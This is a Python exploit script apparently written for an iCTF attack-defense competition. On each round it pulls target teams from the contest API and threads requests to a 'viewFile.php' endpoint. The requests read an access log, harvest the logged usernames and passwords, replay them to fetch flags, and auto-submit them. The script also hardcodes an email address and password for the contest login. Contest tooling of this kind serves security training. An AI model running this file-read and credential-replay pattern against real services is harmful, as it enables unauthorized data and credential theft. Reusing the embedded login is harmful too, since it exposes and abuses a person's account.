from ictf import iCTF
import threading
import sys
from time import sleep
import random
import socket
import re

# Shiny colors
OKBLUE  = '\033[94m'
OKGREEN = '\033[92m'
WARNING = '\033[93m'
FAIL    = '\033[91m'
ENDC    = '\033[0m'

# Custom recv_unitl.. you know.. for reasons
def recv_until(s, text):
    BUFFER_SIZE = 2048
    data = ""
    loop = True
    while loop:
        tmp = s.recv(BUFFER_SIZE)
        if tmp.find(text) != -1: loop = False
        data += tmp
    return data

# Prepare everything and fire the exploits!!!
def prepare():
    # Get the initial
    ticks = 42;
    # Get iCTF-Foo and login
    ctf     = iCTF()
    team    = ctf.login("dominik.schlecht@hotmail.de", "cupjCQdjednhn4yZ")

    while(True):
        if ticks == team.get_tick_info().get("tick_id"):
            sleep(30)
            print OKBLUE    + "[~] Waiting for TICK"                    + ENDC
        else:
            # Maybe kill threads here..
            # We got a new tick, start the exploits!!1!
            ticks = team.get_tick_info().get("tick_id")

            # holts targets in format:
            #  {'team_name' : "Team name",'ip_address' : "10.7.<team_id>.2",'port' : <int port number>,'flag_id' : "Flag ID to steal"}
            targets = team.get_targets("text_file_store")

            # not really needed..
            results = []

            for target in targets.get("targets"):
                # Prevent too many threads (no DoS!!!)
                while 20 < threading.activeCount():
                    sleep(0.1)

                # Create a new thread running an exploit
                thread = exploit(
                            target.get("ip_address"),
                            target.get("port"),
                            target.get("flag_id"),
                            team
                        )
                results.append(thread)
                thread.start()

# Multithreaded class
class exploit(threading.Thread):
    def __init__(self, ip, port, flagID, team):
    	threading.Thread.__init__(self)
    	self.ip = ip
        self.port = port
    	self.flagID = flagID
        self.team   = team

    def run(self):
        # Init the socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((self.ip, self.port))

        # Your exploit here!
        request = "GET /viewFile.php?file=access.log HTTP/1.1\nHost: " + self.ip + ":" + str(self.port) + "\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.4.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nConnection: keep-alive\n\n"
        s.send(request)

        data = ""
        result = s.recv(1024)
        data += result
        while len(result) > 0:
            result = s.recv(1024)
            data += result
        s.close()
        #data = data[-20000:]

        allEntries  = re.findall("userName=\w{16}&userPassword=\w{40}", data)

        for entrie in allEntries:
            print entrie
            flgID  = re.findall("userName=\w{16}", entrie)[0][9:]
            pw      = re.findall("userPassword=\w{40}", entrie)[0][13:]
            print flgID
            print pw


            if flgID == self.flagID:
                request = "GET /viewFile.php?userName=" + flgID +"&userPassword="+ pw + " HTTP/1.1\r\nHost: " + self.ip + ":" + str(self.port) +"\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.4.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: deflate\r\nConnection: keep-alive\r\n\r\n"
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((self.ip, self.port))
                s.send(request)
                flag = s.recv(2000)
                flag = flag[-16:]
                # Clean up
                s.close()

                # Submit it!
                # Param needs to be a list
                ret = self.team.submit_flag([flag])

                for resp in ret:
                    if resp == "correct":
                        print OKGREEN   + "[+] Submitted flag sucessfully"              + ENDC
                    elif resp == "incorrect":
                        print FAIL      + "[-] Incorrect flag"                          + ENDC
                    elif resp == "alreadysubmitted" or resp == "notactive":
                        print WARNING   + "[|] Flag already submitted or not active"    + ENDC
                    elif resp == "toomanyincorrect":
                        print FAIL      + "[-] Too many incorrect flags"                + ENDC
                    else:
                        print OKBLUE    + "[~] Magic happening!!!!!"                    + ENDC

# Start here..
if __name__ == '__main__':
    prepare()
